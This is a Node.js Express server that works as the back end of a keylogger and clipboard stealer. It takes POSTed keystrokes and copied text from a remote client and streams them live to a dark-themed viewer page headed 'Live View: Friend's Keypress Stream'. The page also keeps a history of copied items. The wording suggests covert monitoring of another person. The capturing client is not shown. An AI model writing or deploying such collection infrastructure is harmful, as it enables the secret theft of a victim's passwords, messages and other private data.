const express = require('express');
const app = express();
const PORT = 3000;

app.use(express.json());

let connectedClients = [];
let logs = [];
let clipboardLogs = [];

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Live Keypress & Clipboard Stream</title>
            <style>
                body { font-family: 'Courier New', Courier, monospace; background: #121212; color: #00ff66; padding: 20px; }
                .header-container { display: flex; justify-content: space-between; align-items: center; }
                h2 { color: #ffffff; font-family: sans-serif; margin: 0; }
                button { background: #00ff66; color: #121212; border: none; padding: 10px 15px; font-weight: bold; border-radius: 5px; cursor: pointer; font-family: sans-serif; }
                button:hover { background: #00cc52; }
                pre { background: #1e1e1e; padding: 20px; border-radius: 8px; white-space: pre-wrap; word-wrap: break-word; border: 1px solid #333; height: 70vh; overflow-y: auto; }
                
                /* Modal Styles */
                .modal { display: none; position: fixed; z-index: 10; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); }
                .modal-content { background-color: #1e1e1e; margin: 10% auto; padding: 20px; border: 1px solid #00ff66; width: 60%; border-radius: 8px; color: #00ff66; max-height: 60vh; overflow-y: auto; }
                .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
                .close:hover { color: #fff; }
            </style>
        </head>
        <body>
            <div class="header-container">
                <h2>Live View: Friend's Keypress Stream</h2>
                <button onclick="showClipboardModal()">Display Clipboard</button>
            </div>
            
            <pre id="log-container">Waiting for activity...</pre>
            
            <!-- Clipboard Modal -->
            <div id="clipboardModal" class="modal">
                <div class="modal-content">
                    <span class="close" onclick="closeClipboardModal()">&times;</span>
                    <h3 style="font-family: sans-serif; color: #fff; margin-top: 0;">Copied Items History</h3>
                    <pre id="clipboard-container" style="height: 40vh;">No clipboard data captured yet.</pre>
                </div>
            </div>

            <script>
                const logContainer = document.getElementById('log-container');
                const clipboardContainer = document.getElementById('clipboard-container');

                // Load existing history from server memory
                fetch('/all-logs')
                    .then(res => res.json())
                    .then(data => {
                        if (data.length > 0) {
                            logContainer.textContent = data.join('\\n');
                        }
                    });

                fetch('/all-clipboards')
                    .then(res => res.json())
                    .then(data => {
                        if (data.length > 0) {
                            clipboardContainer.textContent = data.join('\\n\\n-------------------\\n\\n');
                        }
                    });

                const evtSource = new EventSource('/stream');
                evtSource.onmessage = function(event) {
                    if (event.data === "CLEAR") {
                        logContainer.textContent = "New session started...";
                        clipboardContainer.textContent = "No clipboard data captured yet.";
                        return;
                    }

                    if (event.data.startsWith('CLIPBOARD_ITEM:')) {
                        const rawClipText = event.data.replace('CLIPBOARD_ITEM:', '');
                        let currentText = clipboardContainer.textContent;
                        if (currentText === "No clipboard data captured yet.") {
                            clipboardContainer.textContent = rawClipText;
                        } else {
                            clipboardContainer.textContent += '\\n\\n-------------------\\n\\n' + rawClipText;
                        }
                        return;
                    }

                    // Regular keypress updates
                    if (logContainer.textContent === "Waiting for activity..." || logContainer.textContent === "New session started...") {
                        logContainer.textContent = event.data;
                    } else {
                        logContainer.textContent += '\\n' + event.data;
                    }
                    window.scrollTo(0, document.body.scrollHeight);
                };

                function showClipboardModal() {
                    document.getElementById('clipboardModal').style.display = 'block';
                }

                function closeClipboardModal() {
                    document.getElementById('clipboardModal').style.display = 'none';
                }

                window.onclick = function(event) {
                    let modal = document.getElementById('clipboardModal');
                    if (event.target == modal) {
                        modal.style.display = 'none';
                    }
                }
            </script>
        </body>
        </html>
    `);
});

app.post('/start-session', (req, res) => {
    logs = [];
    clipboardLogs = [];
    connectedClients.forEach(client => {
        client.res.write(`data: CLEAR\n\n`);
    });
    res.status(200).json({ status: 'session reset' });
});

app.post('/log', (req, res) => {
    const logLine = req.body.log;
    if (logLine) {
        logs.push(logLine);
        connectedClients.forEach(client => {
            client.res.write(`data: ${logLine}\n\n`);
        });
        res.status(200).json({ status: 'success' });
    } else {
        res.status(400).json({ error: 'No log data provided' });
    }
});

app.post('/clipboard', (req, res) => {
    const clipText = req.body.text;
    if (clipText) {
        clipboardLogs.push(clipText);
        connectedClients.forEach(client => {
            client.res.write(`data: CLIPBOARD_ITEM:${clipText}\n\n`);
        });
        res.status(200).json({ status: 'success' });
    } else {
        res.status(400).json({ error: 'No clipboard text provided' });
    }
});

app.get('/all-logs', (req, res) => {
    res.json(logs);
});

app.get('/all-clipboards', (req, res) => {
    res.json(clipboardLogs);
});

app.get('/stream', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');

    const clientId = Date.now();
    connectedClients.push({ id: clientId, res });

    req.on('close', () => {
        connectedClients = connectedClients.filter(c => c.id !== clientId);
    });
});

app.listen(PORT, () => {
    console.log(`[Server Ready] Listening on http://localhost:${PORT}`);
});